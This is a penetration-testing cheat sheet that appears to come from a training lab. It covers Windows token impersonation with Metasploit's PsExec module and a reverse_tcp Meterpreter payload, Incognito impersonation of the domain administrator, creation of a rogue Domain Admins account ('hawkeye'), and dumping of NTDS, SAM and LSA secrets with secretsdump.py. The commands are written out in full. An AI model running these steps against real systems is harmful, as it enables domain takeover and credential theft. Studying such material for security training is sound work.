---

# 🛡️ **Token Impersonation Walkthrough Cheat Sheet**

---

### **Summary**

This walkthrough demonstrates the process of exploiting SMB vulnerabilities to perform **token impersonation** in a Windows domain environment. We will leverage the **PsExec module** in Metasploit to gain SYSTEM access and escalate privileges using **Meterpreter's Incognito** extension. The guide includes adding a new domain admin user and dumping domain secrets using [**secretsdump.py**](http://secretsdump.py/) to retrieve sensitive information from the domain controller.

Here’s a quick, easy-to-digest summary of the steps we took:

### **Token Impersonation Summary**:

1. **Connect using PsExec**:
    - Used stolen credentials (fcastle) to gain access via Metasploit’s **PsExec**.
2. **Gain SYSTEM access**:
    - PsExec automatically gives us **SYSTEM privileges** on the target machine.
3. **Load Incognito**:
    - Loaded the **Incognito** extension in Meterpreter to manage tokens.
4. **Impersonate Admin**:
    - Used `impersonate_token MARVEL\\\\administrator` to act as the domain admin.
5. **Verify Admin Access**:
    - Used `shell` to confirm we are now **`marvel\\administrator`** with domain admin privileges.
6. **Create New User**:
    - Created a new domain user (`hawkeye`) and added them to the **Domain Admins** group.
7. **Dump Secrets**:
    - Used **hawkeye’s credentials** to run [**secretsdump.py**](http://secretsdump.py/) and extract sensitive data (password hashes, Kerberos keys) from the domain controller.

---

### **Detailed Notes**

---

### **1. Setting up Metasploit**

```bash
msfconsole

```

- **Search and use PsExec module**:
    
    ```bash
    search psexec
    use exploit/windows/smb/psexec
    
    ```
    
- **Configure settings**:
    
    ```bash
    set payload windows/x64/meterpreter/reverse_tcp
    set rhosts 192.168.164.139
    set smbuser fcastle
    set smbpass Password1
    set smbdomain MARVEL.local
    
    ```
    
- **Run the exploit**:
    
    ```bash
    exploit
    
    ```
    

---

### **2. Gaining SYSTEM Access**

Once access is obtained, verify the account:

```bash
meterpreter > shell
whoami  # Output: nt authority\\system

```

- **Terminate session**:
    
    ```bash
    Terminate channel 1? [y/N] y
    
    ```
    

---

### **3. Loading Incognito Extension**

- **Load Incognito**:
    
    ```bash
    meterpreter > load incognito
    
    ```
    
- **Check available tokens**:
    
    ```bash
    meterpreter > list_tokens -u
    
    ```
    
- **Impersonate a token (fcastle)**:
    
    ```bash
    meterpreter > impersonate_token marvel\\\\fcastle
    whoami  # Output: marvel\\fcastle
    
    ```
    
- **Revert to SYSTEM**:
    
    ```bash
    meterpreter > rev2self
    meterpreter > getuid  # Output: NT AUTHORITY\\SYSTEM
    
    ```
    

---

### **4. Privilege Escalation**

- **Impersonate MARVEL Administrator**:
    
    ```bash
    meterpreter > impersonate_token MARVEL\\\\administrator
    whoami  # Output: marvel\\administrator
    
    ```
    

---

### **5. Adding a Domain Admin User**

- **Create a new user**:
    
    ```bash
    net user /add hawkeye Password1@ /domain
    
    ```
    
- **Add user to Domain Admins**:
    
    ```bash
    net group "Domain Admins" hawkeye /ADD /DOMAIN
    
    ```
    

Both commands return:

**"The request will be processed at a domain controller for domain MARVEL.local."**

---

### **6. Dumping Domain Secrets**

Run [**secretsdump.py**](http://secretsdump.py/) to extract sensitive data from the domain controller:

```bash
secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.164.138

```

Key output:

- Extracted NTDS.DIT hashes and Kerberos keys for domain accounts.
- **SAM hashes**, **LSA Secrets**, and cached credentials.

---

### **Abbreviations & Definitions**

---

- **SMB**: **Server Message Block** – A protocol for shared access to files and printers.
- **PsExec**: A tool for executing processes on remote systems using Windows Sysinternals.
- **NTDS.DIT**: Active Directory database that stores domain information.
- **Incognito**: Meterpreter extension for token manipulation (privilege escalation).
- **Delegation Token**: A token that allows a service to act on behalf of a user.

---

### **Critical Mentions & Exam Traps**

---

🚨 **Always verify impersonation**:

- After using `impersonate_token`, confirm the new context with `whoami` to ensure successful privilege escalation.

🚨 **Revert to SYSTEM**:

- Use `rev2self` after impersonating another token to return to **SYSTEM** context.

💡 **List tokens before impersonation**:

- Use `list_tokens -u` to view available tokens. Always check **Delegation Tokens** for higher privilege targets.

🚨 **secretsdump errors**:

- Be cautious of `SAM hashes extraction failed: string index out of range`. This error can arise from incomplete permissions or unsuccessful privilege escalation.

---
